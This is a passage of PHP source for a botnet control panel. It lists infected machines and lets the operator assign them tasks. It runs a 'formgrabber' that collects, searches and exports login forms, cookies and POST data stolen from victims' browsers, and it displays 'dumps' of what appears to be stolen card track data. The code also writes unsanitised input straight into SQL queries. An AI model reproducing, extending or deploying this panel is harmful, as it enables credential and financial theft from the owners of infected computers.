                <div class="panel-body">
                    <form method="GET" action="">
                        <input type="hidden" name="act" value="clients">

                        <div class="radio">

                            <label>
                                <input type="radio" class="regular-radio" checked="checked" name="status"
                                       value="online">Show only
                                online bots
                            </label>
                            <br>
                            <label>
                                <input type="radio" name="status" value="total">Show all online & offline
                                bots
                            </label>
                            <br>
                            <label>
                                <input type="radio" name="status" value="offline">Show only offline bots
                            </label>
                        </div>

                        <div class="input-group">
                            <span class="input-group-addon">By country :&nbsp;&nbsp;&nbsp;&nbsp;</span>
                            <select class="form-control" name="countries" style="width: 100%">
                                <option value=ALL> All countries</option>
                                <?php
                                for ($i = 1; $i < 247; $i++) {
                                    echo '<option value=' . $country_codes[$i] . '>' . $country_names[$i] . ' (' . $country_codes[$i] . ')</option>';
                                }
                                ?>
                            </select>
                        </div>

                        <div class="input-group">
                            <span
                                class="input-group-addon">By bot id :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                            <input class="form-control" id="bot_uid" name="bot_uid" type="text">
                        </div>

                        <div class="input-group">
                            <span class="input-group-addon">By machine id :</span>
                            <input class="form-control" id="bot_name" name="bot_name" type="text">
                        </div>

                        <div class="input-group">
                            <span
                                class="input-group-addon">By bot ip :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                            <input class="form-control" id="bot_ip" name="bot_ip" type="text">
                        </div>

                        <div class="input-group">
                            <span class="input-group-addon">By bot OS :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                            <select class="form-control" name="os" style="width: 100%">
                                <option value=""> All OS</option>
                                <?php
                                $query = mysql_query("SELECT bot_os,COUNT(*) AS CNT FROM botnet_bots GROUP BY bot_os");
                                while ($row = mysql_fetch_array($query)) {
                                    echo "<option value=\"$row[bot_os]\"> $row[bot_os]</option>";
                                }
                                ?>
                            </select>
                        </div>
                        <br>
                        <input class="btn btn-sm btn-info pull-right" type="submit" name="filter" value="Filter">
                    </form>
                </div>
            </div>

            <?php
            GetPagination($page, $str, $count_pages);

            global $options;
            echo '<table style="font-size:9pt;width:100%;" class="table table-striped table-condensed table-hover">' .
                '<tr class="active">' .
                '<th><b>Machine id</th>' .
                '<th><b>HWID</th>' .
                '<th><b>IP address' .
                '<th><b>OS</th>' .
                '<th><b>Antivirus</th>' .
                '<th style="text-align: center;"><b>Country</th>' .
                '<th style="text-align: center;"><b>Version</th>' .
                '<th><b>Quality</th>' .
                '<th><b>Status</th>' .
                '<th style="text-align: center;"><b>Action</th>' .
                '</tr>' .
                '<tbody>';
            for ($i = 0; $i < $rows; $i++) {
                $row = mysql_fetch_assoc($res);
                echo '<tr class="active">' .
                    '<td>' . $row['bot_uid'] . '</td>' .
                    '<td><a href = "?act=ff&show_by_uid=' . $row['bot_name'] . '" title="Show bot logs">' . urldecode($row['bot_name']) . '</a></td>' .
                    '<td>' . $row['bot_ip'] . '</td>' .
                    '<td>' . $row['bot_os'] . '</td>' .
                    '<td>' . urldecode($row['bot_av']) . '</td>' .
                    '<td style="text-align: center;vertical-align:middle;">' . ShowFlag($row['bot_country'], $options[$row['bot_country']]) . '</td>' .
                    '<td style="text-align: center;vertical-align:middle;">' . $row['bot_version'] . '</td>' .
                    '<td> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="' . $row['bot_quality'] . '"> </td>';
                if (intval($row['bot_time']) > intval(time() - (60 * refresh_rate("get", null)))) {
                    echo '<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ3RjQwMjI0MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ3RjQwMjI1MzlFODExRTRBNDg1ODJFMUI0NjVGQzA4Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDdGNDAyMjIzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDdGNDAyMjMzOUU4MTFFNEE0ODU4MkUxQjQ2NUZDMDgiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5Fk6I0AAAAP1BMVEX///8AMwAAPgAAdAAAjwAAkQAAlAAAlgAAmAAAmQAAmgAAmwAAngAAoQAAowAAqQAArAAArQAArgAA/wD///+npAnLAAAAAXRSTlMAQObYZgAAAM9JREFUOMutk9sOwyAMQ4EMmrb0tuX/v3V26Z6WrZPWcGRFkWPBAyGEdEEFVHpcUIk59+H+N0hK27BdAIKGdT3Dzj0IWpaerP36sTGxMw+DuuUMk16+e2YEdfPsYmYdhSq2d5g3fSeFOE3Fw2YRm0ya8qAr+9TzM6jU6mBSKteb8lR2LHH8MUQ/px6Lh+5dafcScfwIGsfsYTJmLjblyeOhnh9BmtUFb1Au6itI0XGaxfEj6KbqgzeoChuoQG9Q5dQxR3w2/Rj1O/v3jxdUCE92yC3ZVzx+VgAAAABJRU5ErkJggg==" title="Last access: ' . $row['bot_date'] . '"></td>';
                } else {
                    echo '<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkNCRTQ0RDcwMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkNCRTQ0RDcxMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6Q0JFNDRENkUzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6Q0JFNDRENkYzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz41c02nAAAAWlBMVEX///9JAgJvBQV8AgV9Bwd/BAqBAAPVBxfYAhHmAhTmGCXnBhj/AR3/ASD/AiH/BSH/BSX/DCf/DST/Eir/GCb/Giz/ICj/IC3/KCv/KC//LjH/U1P/X1////9Eo2rSAAAAAXRSTlMAQObYZgAAAQNJREFUOMutU9uOgyAUPN6qiMULIGvX8/+/uXNQk6bS7oMlw2SYzJnAA0SUl+VlEFa+rr+XkUnP4+dxGWtJ5TIvX0BO1ccA8yKb/62qKA9hfgue25ZDWzP4QwyoqArOexc2QG/YHdbBsXae66DfZaLj8TRnvZjeRo4Qh5mtA/m4NYuGE49H5mmqoMLaKQGetGbLNVjrGkU66t0/51E0TqOgfwKOrMdexoX7ketDy73EeZ1CUT8MCSA8cLPxMKCgOZxG6+acR1GyZxtXG6NWHTpyIl/QzXQmBbzAYBxCdQY3OXT0z3ncKN1jjFLIy4jCUYF3Hf1TviDK7t39MjL5/rcvLKI/xWJOTGTVfyAAAAAASUVORK5CYII=" title="Last access: ' . $row['bot_date'] . '"></td>';
                }
                echo '<td style="text-align: center;vertical-align:middle;">' .
                    '<a href = "?act=tasks&botuid=' . $row['bot_uid'] . '" title="Add a task to the current bot"><span class="glyphicon glyphicon-plus-sign"></a>' .
                    '<a href = "?act=clients&botuid=' . $row['bot_uid'] . '&bot=kill" title="Remove the task from the database"><span class="glyphicon glyphicon-minus-sign"></a>' .
                    '</td></tr>';
            }
            echo '</tbody></table>';
            GetPagination($page, $str, $count_pages);
        }
    }
}

if ($act == "files") {
    $dirname = "files";
    GetFiles($dirname, $bots_files);
}
if ($act == "ff") {

if ($_GET['form'] == "kill") {
    $bot_form_hash = htmlspecialchars(addslashes($_GET['bot_form_hash']));
    $sql = "DELETE FROM botnet_ff WHERE bot_form_hash='" . $bot_form_hash . "'";
    if (mysql_query($sql))
        MessageRedirect($ff);
}
if (($_POST['save'])) {
    if ($_POST['ff_enable'] == "ff_enable") {
        mysql_query("UPDATE formgrabber_enabled SET enabled='on'");
    } else {
        mysql_query("UPDATE formgrabber_enabled SET enabled='off'");
    }
    mysql_query("UPDATE formgrabber_host SET block='" . $_POST['blacklisted'] . "'");
    mysql_query("UPDATE formgrabber_host SET hostnames='" . $_POST['hostnames'] . "'");
    MessageRedirect($ff);
}

if (isFFEnabled())
    $enabled = "checked";

$hostnames = mysql_result(mysql_query("SELECT hostnames FROM formgrabber_host"), 0);
$blacklisted_hostnames = mysql_result(mysql_query("SELECT block FROM formgrabber_host"), 0);
$logs_count = intval(mysql_result(mysql_query("SELECT COUNT(*) FROM botnet_ff"), 0));
?>


<div class="panel panel-info" style="width: 80%;margin: 0 auto;">
<div class="panel-heading"><b>Formgrabber (<?php echo $logs_count; ?>)</b></div>
<div class="panel-body">

<form method="POST" action="">
    <input type="hidden" name="act" value="ff">

    <div style="text-align: right;">
        <div class="btn-group btn-group-xs">
            <a id="show" class="btn btn-info" title="Show options panel">Show</a>
            <a id="hide" class="btn btn-info" title="Hide options panel">Hide</a>
        </div>
    </div>

    <div class="panel panel-info" id="filter">
        <div class="panel-heading">Options</div>
        <div class="panel-body">
            <div class="checkbox">
                <label>
                    <input type="checkbox" name="ff_enable" value="ff_enable" <?php echo $enabled; ?>> Enable
                    formgrabber
                </label>
            </div>
            <div class="form-group has-success">
                <label class="control-label" for="inputSuccess">Grabbing by host :</label>
                <input class="form-control" name="hostnames" type="text" title="Type 'capture_all' for disable filter"
                       value="<?php echo $hostnames; ?>">
            </div>

            <div class="form-group has-error">
                <label class="control-label" for="inputSuccess">Blacklist :</label>
                <textarea rows="1" cols="70" onfocus="this.rows = 9" onblur="this.rows = 1" type="text"
                          style="width: 100%" name="blacklisted"
                          class="form-control"><?php echo $blacklisted_hostnames; ?></textarea>
            </div>

            <div style="text-align: right">
                <input type="submit" style="text-align: center" name="save" class="btn btn-sm btn-info"
                       value="Save setting">
            </div>
        </div>
    </div>
</form>
<form method="GET" action="">
    <input type="hidden" name="act" value="ff">

    <div class="input-group">
        <span class="input-group-addon">  Start search from date :</span>
        <input type="text" class="form-control" style="width: 20%" id="dp1" name="dp1"
            <?php  if (isset($_GET['dp1'])) {
                echo "value =\"" . htmlspecialchars($_GET['dp1']) . "\"";
            }?>>

        <input type="text" class="form-control" style="width: 25%" id="dp2" name="dp2"
            <?php  if (isset($_GET['dp2'])) {
                echo "value =\"" . htmlspecialchars($_GET['dp2']) . "\"";
            }?>>
    </div>

    <div class="input-group" style="width: 65%">
        <span class="input-group-addon">By hostname :</span>
        <input class="form-control" type="text" name="show_by_link" placeholder="example.com"
            <?php  if (isset($_GET['show_by_link'])) {
                echo "value =\"" . htmlspecialchars($_GET['show_by_link']) . "\"";
            }?>>
    </div>

    <div class="input-group" style="width: 65%">
        <span class="input-group-addon">By form data :</span>
        <input class="form-control" type="text" name="show_by_data" placeholder="login="
            <?php  if (isset($_GET['show_by_data'])) {
                echo "value =\"" . htmlspecialchars($_GET['show_by_data']) . "\"";
            }?>>
    </div>

    <div class="input-group" style="width: 65%">
        <span class="input-group-addon">By bot ip :</span>
        <input class="form-control" type="text" name="show_by_ip"
            <?php  if (isset($_GET['show_by_ip'])) {
                echo "value =\"" . htmlspecialchars($_GET['show_by_ip']) . "\"";
            }?>>
    </div>

    <div class="input-group" style="width: 65%">
        <span class="input-group-addon">By machine id :</span>
        <input class="form-control" type="text" name="show_by_uid"
            <?php  if (isset($_GET['show_by_uid'])) {
                echo "value =\"" . htmlspecialchars($_GET['show_by_uid']) . "\"";
            }?>>
    </div>

    <br>
    <input class="btn btn-sm btn-info" type="submit" name="show" value="Search">

    <input class="btn btn-sm btn-info" type="submit" name="reset" value="Reset search">

    <div style="text-align: right">
        <form method="post" action="">
            <input class="btn btn-sm btn-info" type="submit" name="export" value="Export by current filter">
        </form>
        <?php
        $disabled = "disabled";
        if ((!empty($_GET['dp1'])) || (!empty($_GET['dp2'])) || (!empty($_GET['show_by_link'])) || (!empty($_GET['show_by_data'])) || (!empty($_GET['show_by_ip']) || (!empty($_GET['show_by_uid'])))) //
            $disabled = null;
        ?>

        <input <?php echo $disabled; ?> class="btn btn-sm btn-warning" type="submit" name="delete_by_filter"
                                        value="Delete by current filter">
        <input onclick="ConfirmDelete('?act=ff&delete_all=Delete+all'); return false" class="btn btn-sm btn-warning"
               type="submit" name="delete_all" value="Delete all">
    </div>
</form>
<br>

<?php
if (($_GET['reset'])) {
    echo "<script>location=\"$ff\";</script>";
}
$sql = "SELECT * FROM botnet_ff";

if (($_GET['dp1'])) {
    $sql .= " WHERE `bot_date` BETWEEN STR_TO_DATE('" . addslashes($_GET['dp1']) . "','%Y-%m-%d')";
}
if (($_GET['dp2'])) {
    if (strstr($sql, " WHERE ") == FALSE) {
        $sql .= " WHERE `bot_date` <= ";
    } else
        $sql .= " AND ";
    $sql .= "STR_TO_DATE('" . addslashes($_GET['dp2']) . "','%Y-%m-%d')";
}
if (($_GET['dp1']) && (!isset($_GET['dp2']))) {
    $sql .= " AND STR_TO_DATE('" . date('Y-m-d') . "','%Y-%m-%d')";
}

if (($_GET['show_by_link'])) {
    if (strstr($sql, " WHERE ") == FALSE) {
        $sql .= " WHERE ";
    } else
        $sql .= " AND ";

    $string = addslashes($_GET['show_by_link']);
    $sql .= "FROM_BASE64(bot_host) like '%" . $string . "%'";
}

if (($_GET['show_by_data'])) {
    if (strstr($sql, " WHERE ") == FALSE) {
        $sql .= " WHERE ";
    } else
        $sql .= " AND ";

    $string = addslashes($_GET['show_by_data']);
    $sql .= "FROM_BASE64(bot_form) like '%" . $string . "%'";
}

if (($_GET['show_by_ip'])) {
    if (strstr($sql, " WHERE ") == FALSE) {
        $sql .= " WHERE ";
    } else
        $sql .= " AND ";
    $sql .= "`bot_ip` like '%" . addslashes($_GET['show_by_ip']) . "%'";
}

if (($_GET['show_by_uid'])) {
    if (strstr($sql, " WHERE ") == FALSE) {
        $sql .= " WHERE ";
    } else
        $sql .= " AND ";
    $sql .= "`bot_uid` like '%" . addslashes(($_GET['show_by_uid'])) . "%'";
}

if (($_GET['delete_by_filter'])) {

    mysql_query(str_replace("SELECT *", "DELETE", $sql));
    MessageRedirect($ff);
}

if (($_GET['delete_all'])) {
    $sql = "truncate table botnet_ff";
    mysql_query($sql);
    MessageRedirect($ff);
}
if (($_GET['export'])) {
    $res = mysql_query($sql);
    if ($res)
        $rows = mysql_num_rows($res);

    if ($rows != 0) {
        $ff_export = null;
        for ($i = 0; $i < $rows; $i++) {
            $row = mysql_fetch_assoc($res);
            $buffer = str_replace('&', PHP_EOL, urldecode(base64_decode($row['bot_form'])));

            $ff_export .=
                '====================================' . PHP_EOL
                . 'Machine id : ' . $row['bot_uid'] . PHP_EOL
                . 'Machine IP : ' . $row['bot_ip'] . PHP_EOL
                . 'Host : ' . base64_decode($row["bot_host"]) . PHP_EOL
                . 'Date : ' . $row["bot_date"] . PHP_EOL
                . 'Browser : ' . $row["bot_browser"] . PHP_EOL
                . 'Form : ' . PHP_EOL . $buffer . PHP_EOL;
        }

        $filename = 'upload/ff-export(' . date('Y-m-d_H-i-s') . ').txt';
        $f = fopen($filename, 'a');
        if ($f == false)
            die('<b>Create file error!</b>');

        fwrite($f, $ff_export . PHP_EOL);
        fclose($f);

        $file_path = null;
        if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on'))
            $file_path .= 'https://';
        else
            $file_path .= 'http://';

        $file_path .= $_SERVER['SERVER_NAME'] . substr(str_replace('\\', '/', realpath(dirname(__FILE__))), strlen(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])))) . '/' . $filename;
        die('<b>Export succesfully!<br>File moved to - "Upload"<br>Direct link - </b><a href="' . $file_path . '">' . $file_path . '</a> (Right click - "Save as")');
    }
}

$sqlc = str_replace("*", "COUNT(*)", $sql);
$bots_page_limit = 10;

$page = intval($_GET['page']);
if ($page) {
    $lim = intval($page * $bots_page_limit);
    $sql .= " LIMIT $lim, $bots_page_limit";
} else
    $sql .= " LIMIT 0, $bots_page_limit";


$count_pages = mysql_result(mysql_query($sqlc), 0);
$count_pages = intval($count_pages / $bots_page_limit);
$qstring = $_SERVER['QUERY_STRING'];
$q_str = explode("&", $qstring);
foreach ($q_str as $s_str) {
    if (strstr($s_str, "page"))
        break;
    else
        $str .= htmlspecialchars($s_str) . "&";
}

$res = mysql_query($sql);
if ($res)
    $rows = mysql_num_rows($res);
if ($rows != 0) {
    echo '<table style="font-size:9pt;" class="table table-striped table-condensed table-hover">'
        . '<th>#</th>'
        . '<th><b>Bot ip</th>'
        . '<th><b>Machine id</th>'
        . '<th><b>Host</th>'
        . '<th><b>Form</th>'
        . '<th style="text-align:center;"><b>Browser</th>'
        . '<th><b>Date</th>'
        . '<th><b>Act</th>';

    for ($i = 0; $i < $rows; $i++) {
        $row = mysql_fetch_assoc($res);
        $host_link = base64_decode($row["bot_host"]);
        $var = str_replace('&', PHP_EOL, base64_decode($row['bot_form']));

        $user_agent = strs($var, "User-Agent:");
        $cookie = strs($var, "Cookie:");
        $refferer = strs($var, "Referer:");
        if (strcmp($row["bot_browser"], "iexplorer"))
            $post_data = strstr($var, "\r\n\r\n");
        else
            $post_data = $var;
        $result = $user_agent . $cookie . $refferer . $post_data;

        echo '<tbody><tr>'
            . '<td><b>' . $i . '</b></td>'
            . '<td style="width=15%">' . $row["bot_ip"] . '</td>'
            . '<td style="width=15%"><a href = "?act=ff&show_by_uid=' . $row['bot_uid'] . '"title="Show logs">' . $row['bot_uid'] . '</a></td>'
            . '<td style="width=20%"><b><a target="_blank" href = "' . "http://anonym.to/?" . $host_link . '" title="' . $host_link . '">' . my_substr($host_link) . '</td>'
            . '<td style="width=15%"><TEXTAREA rows="1" cols="70" onfocus="this.rows = ' . intval(strlen($result) / 50) . '" onblur="this.rows = 1" type="text" style="width: 100%" class="form-control">' . urldecode($var) . '</textarea></td>'
            . '<td style="width=10%;text-align:center;"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="' . strtolower($row['bot_browser']) . '" title="' . $row['bot_browser'] . '"</td>'
            . '<td style="width=10%">' . $row['bot_date'] . "<br>&nbsp;&nbsp;" . $row['bot_time'] . '</td>'
            . '<td style="width=20%"><a href="?act=ff&bot_form_hash=' . $row['bot_form_hash'] . '&form=kill" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td>';
    }

    echo '</tr><tbody></table>';
    GetPagination($page, $str, $count_pages);
}
}
if ($act == "dumps") {
    if (($_GET['delete_all'])) {
        mysql_query("truncate table botnet_dumps");
        MessageRedirect($dumps);
    }
    if ($_GET['form'] == "kill") {
        $track_hash = htmlspecialchars(addslashes($_GET['track_hash']));
        if (mysql_query("DELETE FROM botnet_dumps WHERE track_hash='" . $track_hash . "'"))
            MessageRedirect($dumps);
    }

    $sql = "SELECT * FROM botnet_dumps";
    if (($_GET['export'])) {
        $res = mysql_query($sql);
        if ($res)
            $rows = mysql_num_rows($res);

        if ($rows != 0) {
            echo '<textarea rows="' . intval($rows) . '" style="width: 100%;" onclick="this.select();" class="form-control">';
            for ($i = 0; $i < $rows; $i++) {
                $row = mysql_fetch_assoc($res);
                echo 'ip : ' . ($row["bot_ip"]) . PHP_EOL
                    . 'Date/time : ' . $row["bot_date"] . "/" . $row["bot_time"] . PHP_EOL
                    . 'Data : ' . base64_decode($row["track_data"]) . PHP_EOL . PHP_EOL;
            }
            echo '</textarea>';
            die;
        }
    }

    $sqlc = str_replace("*", "COUNT(*)", $sql);
    $bots_page_limit = 20;

    $page = intval($_GET['page']);
    if ($page) {
        $lim = intval($page * $bots_page_limit);
        $sql .= " LIMIT $lim, $bots_page_limit";
    } else
        $sql .= " LIMIT 0, $bots_page_limit";

    $count_pages = mysql_result(mysql_query($sqlc), 0);
    $count_pages = intval($count_pages / $bots_page_limit);
    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }
    $res = mysql_query($sql);
    if ($res)
        $rows = mysql_num_rows($res);
    if ($rows != 0) {

        GetPagination($page, $str, $count_pages);
        ?>
        <form method="GET" action="">
            <input type="hidden" name="act" value="dumps">

            <div style="text-align: right">
                <input class="btn btn-sm btn-info" type="submit" name="export" value="Export">
                <input onclick="ConfirmDelete('?act=dumps&delete_all=Delete+all'); return false"
                       class="btn btn-sm btn-warning"
                       type="submit" name="delete_all" value="Delete all"> <br>
            </div>
        </form>
        <br>
        <?php
        echo '<table style="font-size:9pt;" class="table table-striped table-condensed table-hover">'
            . '<th>#</th>'
            . '<th><b>Bot ip</th>'
            . '<th><b>Track type</th>'
            . '<th><b>Track data</th>'
            . '<th><b>Date</th>'
            . '<th><b>Act</th>';

        for ($i = 0; $i < $rows; $i++) {
            $row = mysql_fetch_assoc($res);

            $track_data = base64_decode($row["track_data"]);
            echo '<tbody><tr>'
                . '<td>' . $i . '</td>'
                . '<td style="width=20%">' . $row["bot_ip"] . '</td>'
                . '<td style="width=20%">' . $row["track_type"] . '</td>'
                . '<td style="width=20%"><TEXTAREA rows="1" cols="60" onfocus="this.rows = 5" onblur="this.rows = 1" type="text" style="width: 100%">' . $track_data . '</textarea></td>'
